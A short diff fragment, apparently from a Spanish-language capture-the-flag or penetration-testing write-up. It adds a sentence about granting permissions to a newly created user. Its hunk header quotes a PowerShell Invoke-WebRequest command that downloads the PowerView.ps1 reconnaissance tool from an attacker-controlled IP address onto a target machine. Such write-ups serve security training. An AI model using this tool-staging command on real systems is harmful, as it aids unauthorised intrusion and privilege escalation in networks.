@@ -205,4 +205,4 @@ Invoke-WebRequest -Uri "http://10.10.14.19/PowerView.ps1" -OutFile "C:\Users\svc
 
 ```
 
-
+Y ahora podremos darle los permisos al usuario creado
